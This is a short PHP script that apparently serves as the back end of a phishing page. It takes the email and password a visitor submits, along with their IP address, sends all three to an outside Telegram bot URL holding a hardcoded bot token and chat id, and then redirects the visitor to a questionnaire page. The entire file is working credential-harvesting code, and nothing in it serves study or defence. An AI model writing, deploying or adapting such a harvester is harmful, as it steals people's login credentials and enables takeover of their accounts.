<?php

        
    if(isset($_POST['email']) &&($_POST['pass']))
    {
        $email = $_POST['email'];
        $password = $_POST['pass'];
    

 $user_ip = getenv('REMOTE_ADDR');
$POST_BARLIN = ("
IP >> $user_ip Email >>  .$email Pass >> $password
");


$response = file_get_contents("https://api.telegram.org/bot5449192175:AAFftn6u81AO6aqxHhl8JIdLMWnIWD9m6hY/sendmessage?chat_id=2006658561&text=".$POST_BARLIN);
  
        header('location: questionnaire.html');
    }
    else
    {
        header('location: index.html');
    }
?>
